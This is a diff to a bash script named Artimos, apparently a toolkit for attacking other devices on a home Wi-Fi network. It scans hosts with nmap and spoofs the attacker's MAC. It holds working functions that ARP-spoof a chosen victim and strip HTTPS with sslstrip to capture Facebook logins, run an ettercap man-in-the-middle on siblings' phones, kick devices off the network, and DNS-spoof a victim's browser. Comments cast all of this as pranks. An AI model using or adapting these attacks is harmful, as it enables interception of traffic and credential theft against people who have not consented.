@@ -1,13 +1,8 @@
 #!/bin/bash
 cd $HOME\/artimos
-#resize the screen to fit the program
-resize -s 30 110  > /dev/null 2>&1
-bash openScreen.sh &
-#empty the nmap info files
-echo "" > afterInfo.txt
-echo "" > info.txt
-#start the nmap loop in the background
-bash storeInfo.sh &
+
+
+
 #your network variables...
 interface=(`route -n | grep 'UG[ \t]' | awk '{print $8}'`)
 gateway=(`route -n | grep 'UG[ \t]' | awk '{print $2}' | head -n 1`)
@@ -18,6 +13,42 @@ frequency=(`iwconfig $interface  | grep Frequency | awk -F' ' '{ print $2 }' | c
 channel=""
 afterMe=false
 declare -a nameStore
+
+
+#function for storing the nmap info running in the background
+function StoreInfo()
+{
+while true; do
+	nmap -sP $gateway/24 | tr -d '()' | grep -vw "Host\|Starting\|done" > tempInfo.txt
+	cat tempInfo.txt > info.txt
+done
+}
+
+
+
+
+#checks if remaining files exist and creates them if not
+test -f macIds.txt || echo "" > macIds.txt
+test -f personalNameInfo.txt || echo "" > personalNameInfo.txt
+test -f spoofhosts.txt || echo "" > spoofhosts.txt
+
+
+#resize the screen to fit the program
+resize -s 30 110  > /dev/null 2>&1
+
+#Opening screen way too big to put in here.... checking if you have it
+test -f openScreen.sh | bash openScreen.sh &
+test -f openScreen.sh || echo "Welcome to Artimos, Please wait to load..."
+
+#empty the nmap info files
+echo "" > afterInfo.txt
+echo "" > info.txt
+
+
+#start the nmap loop in the background
+StoreInfo &
+
+
 #little trick to find your channel
 case $frequency in
 2.412)
@@ -117,6 +148,9 @@ channel=161
 channel=165
 ;;
 esac
+
+
+
 # starts your interface in monitor mode and in the correct channel with a random MAC address
 # p.s. Good idea to roll your wlan MAC address before starting this program
 airmon-ng stop mon0 > /dev/null 2>&1
@@ -124,7 +158,17 @@ airmon-ng start $interface $channel > /dev/null 2>&1
 ifconfig mon0 down
 macchanger -r mon0 > /dev/null 2>&1
 ifconfig mon0 up
-bash airodumpInfo.sh &
+
+
+#starts collecting information with airodump
+frequencyWithoutDot=(`echo $frequency | sed -e 's/\.//g'`)
+rm -f airodumpInfo-01.csv
+airodump-ng --bssid $gatemac -C $frequencyWithoutDot -w airodumpInfo --output-format csv mon0 > /dev/null 2>&1 &
+
+
+
+
+
 sleep 6
 #naming function for giving nicknames to your friend's MAC addresses and saves them to personalNameInfo.txt
 function name(){
@@ -138,6 +182,9 @@ read tempName
 mac=(`cat afterInfo.txt | grep -w $ipSelect -A1 | tail -n 1 | awk '{print $3}'`)
 echo "$mac $tempName" >> personalNameInfo.txt
 }
+
+
+
 #kicking local IP or nickname, not very usful except for crashing someone's minecraft game ;)
 function kick(){
 name=""
@@ -199,17 +246,22 @@ case "$choice" in
 		;;
 esac
 }
+
+
+
 #sslstrip some poor victim to troll their facebook page
 function sslstrip(){
 ip=""
 read -p "Please enter victim IP: " ip
 echo 1 > /proc/sys/net/ipv4/ip_forward
-gnome-terminal --geometry 100x30-0+0 -x bash sslstrip/sslstrip.sh
 arpspoof -i $interface -t $ip $gateway &
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
 sslstrip -w sslstrip/$gatemac-$ip
 kill $!
 }
+
+
+
 #just if you're curious of what your siblings are always looking at on their phone..
 function mitm(){
 ip=""
@@ -217,6 +269,9 @@ read -p "Please enter victim IP: " ip
 echo 1 > /proc/sys/net/ipv4/ip_forward
 ettercap -i $interface -TQM arp:remote /$gateway/ /$ip/
 }
+
+
+
 #send your victim a friendly message on their browser screen, kinda buggy
 function dns(){
 ip=""
@@ -227,12 +282,14 @@ echo "Please enter an IP address"
 read ip
 echo "Please enter the message to send"
 read message
-echo "<html><body><head><title>ATTENTION!!</title></head><h1>$message</h1></body></html>" > /var/www/index.php
+echo "<html><body><head><title>ATTENTION!!</title></head><h1>$message</h1></body></html>" > /var/www/index.html
 echo 1 > /proc/sys/net/ipv4/ip_forward
 arpspoof -i $interface -t $ip $gateway &
 arpspoof -i $interface -t $gateway $ip &
 dnsspoof -i $interface -f  spoofhosts.txt host  $ip  and  udp  port 53
 }
+
+
 
 #main network analyzer output
 while true;do
